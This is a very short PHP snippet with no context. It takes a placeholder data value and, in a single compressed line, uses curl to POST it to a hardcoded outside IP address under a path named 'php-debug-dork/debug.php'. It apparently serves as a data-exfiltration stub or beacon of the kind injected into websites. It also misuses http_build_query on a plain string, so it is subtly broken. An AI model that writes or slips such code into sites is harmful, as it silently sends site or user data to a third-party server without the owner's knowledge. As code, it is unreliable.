<?php
$dd = 'mydatahere';
$vpsIp='128.199.233.252';$url='http://'.$vpsIp.'/php-debug-dork/debug.php';$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($dd));curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);$server_output=curl_exec($ch);curl_close($ch);
